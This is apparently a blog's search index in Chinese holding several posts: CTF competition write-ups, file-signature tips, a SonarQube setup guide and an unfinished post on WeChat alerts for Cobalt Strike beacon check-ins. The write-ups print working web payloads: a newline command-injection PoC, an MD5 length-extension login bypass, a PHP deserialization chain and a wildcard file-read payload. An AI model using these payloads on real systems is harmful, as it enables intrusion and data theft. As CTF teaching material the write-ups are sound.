<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>自建server酱同款推送+CS上线提醒</title>
      <link href="2021/11/11/zi-jian-server-jiang-tong-kuan-tui-song-cs-shang-xian-ti-xing/"/>
      <url>2021/11/11/zi-jian-server-jiang-tong-kuan-tui-song-cs-shang-xian-ti-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="同款server酱环境"><a href="#同款server酱环境" class="headerlink" title="同款server酱环境"></a>同款server酱环境</h1><h2 id="获取vx服务接口"><a href="#获取vx服务接口" class="headerlink" title="获取vx服务接口"></a>获取vx服务接口</h2><p>如果公众号在创建的时候选择的是个人，就没有权限给用户推送模板消息。这里我们使用基于微信公众平台接口测试，来实现的微信公众号消息推送。</p><p><code>https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login</code></p><p>通过测试号的接口文档，试着用PHP写如下测试代码：</p><pre><code>&lt;?php$appid=&#39;appID&#39;;$secret=&#39;appsecret&#39;;$userid=&#39;微信号（OpenID）&#39;;$template_id=&#39;模板ID&#39;;$title=&#39;测试标题&#39;;$content=&#39;测试内容&#39;;file_get_contents(&#39;https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=&#39;.json_decode(file_get_contents(&#39;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&#39;.$appid.&#39;&amp;secret=&#39;.$secret),true)[&#39;access_token&#39;], false, stream_context_create(array(&#39;http&#39; =&gt; array(&#39;method&#39;=&gt;&#39;POST&#39;,&#39;header&#39;=&gt;&quot;Content-Type: application/json;charset=utf-8&quot;,&#39;content&#39;=&gt;&#39;&#123;&quot;touser&quot;:&quot;&#39;.$userid.&#39;&quot;,&quot;template_id&quot;:&quot;&#39;.$template_id.&#39;&quot;,&quot;data&quot;:&#123;&quot;title&quot;: &#123;&quot;value&quot;:&quot;&#39;.$title.&#39;&quot;&#125;,&quot;content&quot;: &#123;&quot;value&quot;:&quot;&#39;.$content.&#39;&quot;&#125;&#125;&#125;&#39;))));</code></pre><p>账号登录成功后，在配置也中可以找到 appID，appsecret，userid，template_id的参数值。</p><p><img src="/images/VXapi+CS/img.png"></p><p><img src="/images/VXapi+CS/msg.png"></p><p>这里可以自行拓展变量，达到动态获取输入内容的目的。</p><h2 id="在vps启动我们的消息转发服务"><a href="#在vps启动我们的消息转发服务" class="headerlink" title="在vps启动我们的消息转发服务"></a>在vps启动我们的消息转发服务</h2><h2 id="添加cs消息通知脚本"><a href="#添加cs消息通知脚本" class="headerlink" title="添加cs消息通知脚本"></a>添加cs消息通知脚本</h2>]]></content>
      
      
      <categories>
          
          <category> attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bilibili1024CTF</title>
      <link href="2021/10/25/bilibili1024ctf/"/>
      <url>2021/10/25/bilibili1024ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="1024程序员节，大家一起和2233参与解密游戏吧"><a href="#1024程序员节，大家一起和2233参与解密游戏吧" class="headerlink" title="1024程序员节，大家一起和2233参与解密游戏吧~"></a>1024程序员节，大家一起和2233参与解密游戏吧~</h1><p>happy_1024_2233:<br>e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364<br>0408abca7deabb96a58f50471171b60e02b1a8dbd32db156</p><p>48位密文/96位密文️，猜测是AES解密，密钥为happy_1024_2233，无偏移ECB模式解密输出hex得到flag。</p><p><img src="/images/bilibili1024/img.png"></p><h1 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h1><p>webpack打包不严造成的home.vue信息泄漏</p><p><img src="/images/bilibili1024/img_1.png"></p><h1 id="eval-php"><a href="#eval-php" class="headerlink" title="eval.php"></a>eval.php</h1><pre><code>&lt;?php    /*         bilibili- ( ゜- ゜)つロ 乾杯~        uat: http://192.168.3.2/uat/eval.php        pro: http://security.bilibili.com/sec1024/q/pro/eval.php    */    $args = @$_GET[&#39;args&#39;];    if (count($args) &gt;3) &#123;        exit();    &#125;    for ( $i=0; $i&lt;count($args); $i++ )&#123;        if ( !preg_match(&#39;/^\w+$/&#39;, $args[$i]) ) &#123;            exit();        &#125;    &#125;    // todo: other filter    $cmd = &quot;/bin/2233 &quot; . implode(&quot; &quot;, $args);    exec($cmd, $out);    for ($i=0; $i&lt;count($out); $i++)&#123;        echo($out[$i]);        echo(&#39;&lt;br&gt;&#39;);    &#125;?&gt;</code></pre><p>分析代码，思路：传递args参数，需要命中正则<code>/^\w+$/</code> 进入exec()。<br>构造poc：<code>args[]=cat%0a&amp;args[]=ls</code><br>返回以下信息：</p><pre><code>1.txtpasswddataconfig</code></pre><p>用cat读取passwd发现flag<br><code>eval.php?args[]=cat%0a&amp;args[]=cat&amp;&amp;args[]=passwd</code></p><p><img src="/images/bilibili1024/img_2.png"></p><h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1>]]></content>
      
      
      
        <tags>
            
            <tag> -CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF小知识</title>
      <link href="2021/10/23/ctf-xiao-zhi-shi/"/>
      <url>2021/10/23/ctf-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>#各类型文件头</p><p>##音频文件<br><em>Wave (wav)</em> : WAVE 57415645</p><p>##压缩文件<br><em>ZIP Archive (zip)</em> : 文件头-&gt;<code>pk 504b 0304</code> 文件尾：<code>50 4B</code>　</p><p>##伪加密<br>直接搜索属性头，进行修改就好。 一般情况下1403 后面的数据是00 00 就是没有加密的，<br>09 00 一般情况下伪加密是这个样的， 有一个00 00第二个零为奇数基本上就是伪加密，两个属性头只能有一个，如果两个都是，那可能就是真加密。</p><p>##图片<br><em>PNG(png)</em>: 文件头：<code>89504E47</code>　 文件尾：<code>AE 42 60 82</code></p><hr><blockquote><p>Tips:持续更新……</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态源代码扫描之Sonarqube</title>
      <link href="2021/10/21/jing-tai-yuan-dai-ma-sao-miao-zhi-sonarqube/"/>
      <url>2021/10/21/jing-tai-yuan-dai-ma-sao-miao-zhi-sonarqube/</url>
      
        <content type="html"><![CDATA[<p>categories: Code audit</p><h1 id="SonarQube"><a href="#SonarQube" class="headerlink" title="SonarQube"></a>SonarQube</h1><p><a href="https://docs.sonarqube.org/latest/">SonarQube</a> 是一种自动代码审查工具，用于检测代码中的错误、漏洞和代码异常。它可以与您现有的工作流程集成，以支持跨项目分支和拉取请求的持续代码检查。</p><h1 id="docker-psql搭建"><a href="#docker-psql搭建" class="headerlink" title="docker + psql搭建"></a>docker + psql搭建</h1><h2 id="1：使用docker-pull-下载基本镜像"><a href="#1：使用docker-pull-下载基本镜像" class="headerlink" title="1：使用docker pull 下载基本镜像"></a>1：使用docker pull 下载基本镜像</h2><p><img src="/images/sonar/img.jpg" alt="img"></p><h2 id="2：启动镜像时注意psql与sonar进行联通"><a href="#2：启动镜像时注意psql与sonar进行联通" class="headerlink" title="2：启动镜像时注意psql与sonar进行联通"></a>2：启动镜像时注意psql与sonar进行联通</h2><p>postgres： <code>docker run --name sonarqube_postgres -e POSTGRES_USER=sonar -e POSTGRES_PASSWORD=sonar -d postgres</code></p><p>sonarqube: <code>docker run --name sonar --link sonarqube_postgres -e SONARQUBE_JDBC_URL=jdbc:postgresql://sonarqube_postgres:5432/sonar -p 9000:9000 -d sonarqube</code></p><p>由于镜像版本存在差异，最新版docker启动时加载es服务可能由于root权限导致启动失败，遇见启动一场可使用 <code>docker logs [$dockername]</code> 进行排查。<br>启动后访问<a href="http://localhost:9000,admin,admin即可进入管理面板。">http://localhost:9000,admin,admin即可进入管理面板。</a></p><h1 id="代码扫描"><a href="#代码扫描" class="headerlink" title="代码扫描"></a>代码扫描</h1><h2 id="创建扫描项目"><a href="#创建扫描项目" class="headerlink" title="创建扫描项目"></a>创建扫描项目</h2><p>设置你的扫描对象，选择语言和本地的系统，下载相应的SonarScanner<br>project -&gt; create new project -&gt; set up-&gt;</p><p><img src="/images/sonar/img_1.jpg" alt="img"></p><p><img src="/images/sonar/img_2.jpg" alt="img"></p><p><img src="/images/sonar/img_3.jpg" alt="img"></p><p>根据提示在项目代码目录下运行SonarScanner</p><h2 id="配置sonarscanner"><a href="#配置sonarscanner" class="headerlink" title="配置sonarscanner"></a>配置sonarscanner</h2><p>找到scanner路径 \sonar-scanner\conf ，编辑配置文件sonar-scanner.properties<br>设置服务器地址，登录账号密码</p><p><img src="/images/sonar/img_5.jpg" alt="img"></p><h2 id="php代码扫描"><a href="#php代码扫描" class="headerlink" title="php代码扫描"></a>php代码扫描</h2><h3 id="在代码根目录下创建sonar-scanner-properties"><a href="#在代码根目录下创建sonar-scanner-properties" class="headerlink" title="在代码根目录下创建sonar-scanner.properties"></a>在代码根目录下创建sonar-scanner.properties</h3><p><img src="/images/sonar/img_6.jpg" alt="img"></p><h3 id="运行scanner"><a href="#运行scanner" class="headerlink" title="运行scanner"></a>运行scanner</h3><p><img src="/images/sonar/img_7.jpg" alt="img"></p><p>在命令行执行成功后，显示执行时间和内存占用</p><p><img src="/images/sonar/img_4.jpg" alt="img"></p><p>尴尬的事情出现了，样例代码时DVWA的sql漏洞代码，没扫描出问题，因该是规则和策略问题。</p><p><img src="/images/sonar/img_8.jpg" alt="img"></p><h2 id="sonar插件与扫描策略"><a href="#sonar插件与扫描策略" class="headerlink" title="sonar插件与扫描策略"></a>sonar插件与扫描策略</h2><h2 id="java代码扫描-windows客户端"><a href="#java代码扫描-windows客户端" class="headerlink" title="java代码扫描(windows客户端)"></a>java代码扫描(windows客户端)</h2><p>在java代码跟目录编辑sonar-scanner.properties，直接运行bat</p><p><img src="/images/sonar/img_10.jpg" alt="img"></p><p><img src="/images/sonar/img_9.jpg" alt="img"></p><h2 id="导出报告"><a href="#导出报告" class="headerlink" title="导出报告"></a>导出报告</h2><h3 id="下载sonar-pdf-plugin："><a href="#下载sonar-pdf-plugin：" class="headerlink" title="下载sonar-pdf-plugin："></a>下载sonar-pdf-plugin：</h3><p>前往<a href="https://gitee.com/zzulj/sonar-pdf-plugin%E5%BC%80%E6%BA%90%E7%A4%BE%E5%8C%BA%E4%B8%8B%E8%BD%BDpdf%E5%AF%BC%E5%87%BA%E6%8F%92%E4%BB%B6%E5%B9%B6%E6%94%BE%E5%88%B0sonarqube-7.3/extensions/plugins%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E9%87%8D%E5%90%AFsonar%E6%9C%8D%E5%8A%A1%E3%80%82">https://gitee.com/zzulj/sonar-pdf-plugin开源社区下载pdf导出插件并放到sonarqube-7.3\extensions\plugins目录下，重启sonar服务。</a><br>开启pdf插件后，重新扫描一遍项目代码</p><p><img src="/images/sonar/img_12.jpg" alt="img"><br><code>docker inspect -f &#39;&#123;&#123;.ID&#125;&#125;&#39; yourDockerName</code></p><p><code>docker cp /home/kali/sonar-pdf-plugin DockerId:/opt/sonarqube/extensions/plugins</code></p><p><img src="/images/sonar/img_11.jpg" alt="img"></p><p>进入项目到处PDF报告<br><img src="/images/sonar/img_13.jpg" alt="img"></p><p>可读性一般，不如直接在web查阅项目漏洞，可以直接跟进到命中规则代码段。</p><hr><blockquote><p>Tips:参考资料</p><ol><li>扫描原理：<a href="https://blog.csdn.net/wmq880204/article/details/117866872">https://blog.csdn.net/wmq880204/article/details/117866872</a></li></ol></blockquote><hr>]]></content>
      
      
      
        <tags>
            
            <tag> DevSecOps </tag>
            
            <tag> 工具搭建 </tag>
            
            <tag> Code audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冀信2021网络安全竞赛-廊坊分赛</title>
      <link href="2021/10/18/ji-xin-2021-wang-luo-an-quan-jing-sai-lang-fang-fen-sai/"/>
      <url>2021/10/18/ji-xin-2021-wang-luo-an-quan-jing-sai-lang-fang-fen-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="BabyMd5"><a href="#BabyMd5" class="headerlink" title="BabyMd5"></a>BabyMd5</h1><p><a href="http://ip:50197/source.txt">http://IP:50197/source.txt</a></p><pre><code>&lt;?phpif(!isset($_POST[&quot;username&quot;]) || !isset($_POST[&quot;password&quot;]))&#123;    exit();&#125;$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;check&quot;])) &#123;    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;        if ($_COOKIE[&quot;check&quot;] === md5($secret . urldecode($username . $password))) &#123;            echo &quot;Login successful.\n&quot;;            die (&quot;The flag is &quot;. $flag);        &#125;        else &#123;            die (&quot;Wrong Cookies. Get out!&quot;);        &#125;    &#125;    else &#123;        die (&quot;Admins only&quot;);    &#125;&#125;setcookie(&quot;ahash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));?&gt;</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%00%00%00%00%00%00xxx</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><a href="http://183.196.135.117:50957/?a=O:4:%22TOPC%22:2:%7Bs:3:%22obj%22;N;s:4:%22attr%22;O:4:%22TOPB%22:2:%7Bs:3:%22obj%22;N;s:4:%22attr%22;s:127:%22O:4:%22TOPA%22:4:%7Bs:5:%22token%22;N;s:6:%22ticket%22;R:2;s:8:%22username%22;s:17:%22aaaaaaaaaaaaaaaaa%22;s:8:%22password%22;s:18:%22bbbbbbbbbbbbbbbbbb%22;%7D%22;%7D%7D">http://183.196.135.117:50957/?a=O:4:%22TOPC%22:2:{s:3:%22obj%22;N;s:4:%22attr%22;O:4:%22TOPB%22:2:{s:3:%22obj%22;N;s:4:%22attr%22;s:127:%22O:4:%22TOPA%22:4:{s:5:%22token%22;N;s:6:%22ticket%22;R:2;s:8:%22username%22;s:17:%22aaaaaaaaaaaaaaaaa%22;s:8:%22password%22;s:18:%22bbbbbbbbbbbbbbbbbb%22;}%22;}}</a></p><p>pop链是C-&gt;echo-&gt;B-&gt;tostring</p><pre><code>&lt;?phpclass TOPA&#123;    public $token;    public $ticket;    public $username;    public $password;    function __construct()&#123;        $this-&gt;ticket = &amp;$this-&gt;token;    &#125;&#125;class TOPB&#123;    public $obj;    public $attr;    function __construct($a)&#123;            $this-&gt;attr = $a;    &#125;&#125;class TOPC&#123;    public $obj;    public $attr;    function __construct($a)&#123;        $this-&gt;attr = $a;    &#125;&#125;$a = new TOPA();$ser_a = serialize($a);$b = new TOPB($ser_a);$c = new TOPC($b);$ser_c = serialize($c);echo($ser_c);通过&amp;来取址赋值</code></pre><h1 id="bas"><a href="#bas" class="headerlink" title="bas"></a>bas</h1><h2 id="Base64换表"><a href="#Base64换表" class="headerlink" title="Base64换表"></a>Base64换表</h2><pre><code>import base64m = &#39;&#39;&#39;They camefirst for the Communists,and I didn&#39;t speak upbecause I wasn&#39;t a Communist.Then they came for the Jews,and I didn&#39;t speak upbecause I wasn&#39;t a Jew.Then they came for the trade unionists,and I didn&#39;t speak upbecause I wasn&#39;t a trade unionist.Then they came for the Catholics,and I didn&#39;t speak upbecause I was a Protestant.Then they came for me,but by that timeno one was left to speak up.&#39;&#39;&#39;.encode()s1 = base64.b64encode(m).decode()s2 = &quot;ETsovHYqBD8oAnobx6JtAn0bRSIlAHYWy78gwD4kx6IaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7Uayrw9RTVtJ70gyCEfzCM9OtkFzTEfRSIlACptB7UgAHYny6RtwTsoRVkow6NhXnUfAXYQRTIkAT5mwXYaxTEszbY8xTQoB7U8x7FtHHY6BCMfQ6JtBHYPACxfXoIlAD5twTsovHYqBD8oRTAexrY9zTFtwSQsATFtwD4ky74kx6IaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7Uayrw9RTVtwSQsATFtwD4ky74kx6JfXoIlAD5twTsovHYqBD8oRTAexrY9zTFtJ7U9zT0hzDMaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7UaRTVtFSQewTEawTUfwX5PETsoyrY9zTE4RTMsyDFtAn0bRT8oOZkrwCJtBmptwTsswXY9zD8oyn1ty74oRSwsxbYhADA9RSIeRSMdADUiRSEdOt==&quot;chargeList = []for i in range(len(s1)):    tmp1 = [s1[i], s2[i]]    tmp2 = [s2[i], s1[i]]    if tmp1 not in chargeList and tmp2 not in chargeList:        chargeList.append(tmp1)        chargeList.append(tmp2)print(chargeList, len(chargeList))flag_enc = &quot;AncsA6gsATN7LDAqBGZdMTFbAWAoNapcAqAsBqwoMqtaMnFdMC9&quot;flag = &quot;&quot;for i in flag_enc:    for j in chargeList:        if j[1] == i:            flag += j[0]print(flag)print(base64.b64decode(flag + &quot;==&quot;))</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021中国能源网络安全大赛WP集合</title>
      <link href="2021/10/16/2021-zhong-guo-neng-yuan-wang-luo-an-quan-da-sai-wp-ji-he/"/>
      <url>2021/10/16/2021-zhong-guo-neng-yuan-wang-luo-an-quan-da-sai-wp-ji-he/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc-hardwire"><a href="#misc-hardwire" class="headerlink" title="misc-hardwire"></a>misc-hardwire</h2><p>流量分析题，打开压缩包，搜索http，协议最后一个协议包发现有rar文件头部</p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img.png" alt="img.png"></p><p>保存对应的二进制文件到本地，发现存在密码，重新去流量包找密码</p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_1.png" alt="img.png"></p><p>解码得到密码，解压压缩包，拿到flag</p><p>cd /d “C:\php\htdocs”&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E]</p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_2.png" alt="img.png"></p><h2 id="misc-Ware"><a href="#misc-Ware" class="headerlink" title="misc-Ware"></a>misc-Ware</h2><p>把下载的文件放到16进制编辑器，发现存在两个文件头，把第一个文件头和到第二个文件头的内容去掉，留下第二个文件</p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_3.png" alt="img.png"></p><p>使用audacity打开查看频谱图</p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_4.png" alt="img.png"></p><p>短频视为. 长频视为- ，敲出对应莫斯码，解码得到flag</p><p><code>..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...--  ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. -----</code></p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_5.png" alt="img.png"></p><pre><code> -*- coding:utf-8 -*-s = input(&quot;input the cipher_text Enclose with quotes:&quot;)codebook = &#123;    &#39;A&#39;:&quot;.-&quot;,    &#39;B&#39;:&quot;-...&quot;,    &#39;C&#39;:&quot;-.-.&quot;,    &#39;D&#39;:&quot;-..&quot;,    &#39;E&#39;:&quot;.&quot;,    &#39;F&#39;:&quot;..-.&quot;,    &#39;G&#39;:&quot;--.&quot;,    &#39;H&#39;:&quot;....&quot;,    &#39;I&#39;:&quot;..&quot;,    &#39;J&#39;:&quot;.---&quot;,    &#39;K&#39;:&quot;-.-&quot;,    &#39;L&#39;:&quot;.-..&quot;,    &#39;M&#39;:&quot;--&quot;,    &#39;N&#39;:&quot;-.&quot;,    &#39;O&#39;:&quot;---&quot;,    &#39;P&#39;:&quot;.--.&quot;,    &#39;Q&#39;:&quot;--.-&quot;,    &#39;R&#39;:&quot;.-.&quot;,    &#39;S&#39;:&quot;...&quot;,    &#39;T&#39;:&quot;-&quot;,    &#39;U&#39;:&quot;..-&quot;,    &#39;V&#39;:&quot;.--&quot;,    &#39;W&#39;:&quot;.--&quot;,    &#39;X&#39;:&quot;-..-&quot;,    &#39;Y&#39;:&quot;-.--&quot;,    &#39;Z&#39;:&quot;--..&quot;,    &#39;1&#39;:&quot;.----&quot;,    &#39;2&#39;:&quot;..---&quot;,    &#39;3&#39;:&quot;...---&quot;,    &#39;4&#39;:&quot;....-&quot;,    &#39;5&#39;:&quot;.....&quot;,    &#39;6&#39;:&quot;-....&quot;,    &#39;7&#39;:&quot;--...&quot;,    &#39;8&#39;:&quot;---..&quot;,    &#39;9&#39;:&quot;----.&quot;,    &#39;0&#39;:&quot;-----&quot;,    &#39;.&#39;:&quot;.━.━.━&quot;,    &#39;?&#39;:&quot;..--..&quot;,    &#39;!&#39;:&quot;-.-.--&quot;,    &#39;(&#39;:&quot;-.--.&quot;,    &#39;@&#39;:&quot;.--.-.&quot;,    &#39;:&#39;:&quot;---...&quot;,    &#39;=&#39;:&quot;-...-&quot;,    &#39;-&#39;:&quot;-....-&quot;,    &#39;)&#39;:&quot;-.--.-&quot;,    &#39;+&#39;:&quot;.-.-.&quot;,    &#39;,&#39;:&quot;--..--&quot;,    &#39;\&#39;&#39;:&quot;.----.&quot;,    &#39;_&#39;:&quot;..--.-&quot;,    &#39;$&#39;:&quot;...-..-&quot;,    &#39;;&#39;:&quot;-.-.-.&quot;,    &#39;/&#39;:&quot;-..-.&quot;,    &#39;\&quot;&#39;:&quot;.-..-.&quot;,&#125;clear = &quot;&quot;cipher = &quot;&quot; </code></pre><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_5.png" alt="img.png"></p><h2 id="misc-fragment"><a href="#misc-fragment" class="headerlink" title="misc-fragment"></a>misc-fragment</h2><h3 id="解压缩包发现里面是一个拼图，把9块按照顺序拼起来"><a href="#解压缩包发现里面是一个拼图，把9块按照顺序拼起来" class="headerlink" title="解压缩包发现里面是一个拼图，把9块按照顺序拼起来"></a>解压缩包发现里面是一个拼图，把9块按照顺序拼起来</h3><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_6.png" alt="img.png"></p><p>按照九宫格拼图顺序把对应的文件进行排序，使用<br><strong>winhe</strong>分析发现第一张图片存在zip 文件头标志<br><strong>50 4B 03 04</strong>，<br>最后一个图片存在文件尾特征。 且每张图片也在png文件尾<br><strong>AE 42 60 82</strong><br>后都有多余的数据，所以把每个图片多余的数据按照顺序拼起来,得到zip文件，解压得到音频文件。<br>工具</p><h3 id="SilentEye解码的到隐藏的flag-txt"><a href="#SilentEye解码的到隐藏的flag-txt" class="headerlink" title="SilentEye解码的到隐藏的flag.txt"></a><strong>SilentEye</strong>解码的到隐藏的flag.txt</h3><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_7.png" alt="img.png"></p><h3 id="对flag-txt的内容进行数据类型转换："><a href="#对flag-txt的内容进行数据类型转换：" class="headerlink" title="对flag.txt的内容进行数据类型转换："></a>对flag.txt的内容进行数据类型转换：</h3><pre><code>from urllib import parseimport base64flag=&quot;b1011010 x78 0155 x68 Wg== b110011 x73 b110000 0117 0124 SQ== x33 b1001110 b1000100 x6b 0171 x4e 0152 VQ== 0172 x4d b1101101 0116 x6b b1001101 0127 Ug== aw== 0115 x57 TQ== x30 b1001110 x6a 0112 0153 b1011010 Rw== x45 0167 x5a RA== b1010010 0154 x4e 0107 x4d Mg== b1011010 x58 060 x3d&quot;a = flag.split(&#39; &#39;)result=[]print(a)for i in a:    if i[0] == &#39;b&#39;:        i = i[1:]        i = int(i,2)        i = chr(i)        result.append(i)    elif i[0] == &#39;0&#39;:        i = i[1:]        i = int(i,8)        i = chr(i)        result.append(i)    elif i[0] == &#39;x&#39;:        i = int(&quot;0&quot;+i, 16)        i = chr(i)        result.append(i)    else:        i = base64.b64decode(i)        i = bytes.decode(i)        result.append(i)flag = &#39;&#39;.join(result)print(flag)</code></pre><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_8.png" alt="img.png"></p><p>再base<br>ZxmhZ3s0OTI3NDkyNjUzMmNkMWRkMWM0NjJkZGEwZDRlNGM2ZX0=<br>b’g\x19\xa1g{49274926532cd1dd1c462dda0d4e4c6e}’</p><h1 id="crypto-Base"><a href="#crypto-Base" class="headerlink" title="crypto-Base"></a>crypto-Base</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p><code>31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d</code></p><h3 id="hex转换"><a href="#hex转换" class="headerlink" title="hex转换"></a>hex转换</h3><p>13+5=???—-zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</p><h3 id="根据提示rot18"><a href="#根据提示rot18" class="headerlink" title="根据提示rot18"></a>根据提示rot18</h3><p>mzwgcz33hfstmzlggfqtgzrvmyygkmzrmnqwizbshfrteojxmjswmnlbmqzh2===</p><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_9.png" alt="img.png"></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><pre><code>import gmpy2import binasciie1=835967807536519622934604405063c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710e2=885003184250422219085124964981c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400n=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863s = gmpy2.gcdext(e1,e2) #扩展欧几里得算法s1 = s[1]s2 = s[2]#求模反元素if s1 &lt; 0:   s1 = -s1   c1 = gmpy2.invert(c1, n)elif s2 &lt; 0:   s2 = -s2   c2 = gmpy2.invert(c2, n)m = pow(c1, s1, n) * pow(c2, s2, n) % nflag = binascii.unhexlify(hex(m)[2:])print (flag)</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web-HardCode"><a href="#web-HardCode" class="headerlink" title="web-HardCode"></a>web-HardCode</h2><p>首先题目给出需绕过x需要不等于y，并且md5需要恒等</p><p><code>(string)$GET[&#39;x&#39;] !== (string)$GET[&#39;y&#39;] &amp;&amp; md5($GET[&#39;x&#39;]) === md5($GET[&#39;y&#39;])</code></p><p>网上找到文章<br><a href="https://blog.csdn.net/qq_44927883/article/details/110536884">https://blog.csdn.net/qq_44927883/article/details/110536884</a></p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_10.png" alt="img.png"></p><p>绕过!preg_match(“/[a-zA-Z0-9_$@]+/“,$shell)<br><a href="https://blog.51cto.com/u_15274949/2926921">https://blog.51cto.com/u_15274949/2926921</a><br>大佬文章，发现可通过?%3E%3C?= /???/???%20/???? ?%3E可读文件</p><p><strong>构造payload</strong> <code>?%3E%3C?= /???/???%20/*? ?%3E</code><br><a href="http://serverip:23463/?x=M%EF%BF%BDh%EF%BF%BD%0E%EF%BF%BD%5C%20%EF%BF%BDr%EF%BF%BDw%7Br%15%258">http://serverip:23463/?x=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%8</a><br>7%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4<br>b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%0<br>7%fe%a2&amp;y=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%<br>1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%5<br>5%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;code=?%3<br>E%3C?=/???/???%20/*??%3E</p><p><img src="/images/2021%E8%83%BD%E6%BA%90CTF/img_11.png" alt="img.png"></p><h2 id="web-ezphp"><a href="#web-ezphp" class="headerlink" title="web-ezphp"></a>web-ezphp</h2><p>提交请求发现源码，看到path和url猜测考察文件包含<br>1、首先根据源码进入第一个判断，||表示只要有如果 $x 和 $y 至少有一个为 true，则返回 